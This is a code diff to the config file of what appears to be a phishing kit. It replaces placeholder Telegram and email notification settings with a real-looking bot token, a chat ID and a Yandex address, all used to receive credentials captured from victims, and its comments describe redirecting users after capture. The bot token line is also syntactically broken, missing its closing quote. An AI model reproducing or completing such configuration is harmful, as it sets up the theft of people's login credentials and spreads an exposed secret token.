@@ -12,12 +12,12 @@ const config = {
   
   // Notification settings
   telegram: {
-    botToken: "YOUR_TELEGRAM_BOT_TOKEN",
-    chatId: "YOUR_TELEGRAM_CHAT_ID"
+    botToken: "5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g,
+    chatId: "5480674751"
   },
   
   email: {
-    recipient: "admin@yourcompanydomain.com"
+    recipient: "jokersudo@yandex.com"
   },
   
   // Forwarding settings - where to send users after capturing credentials
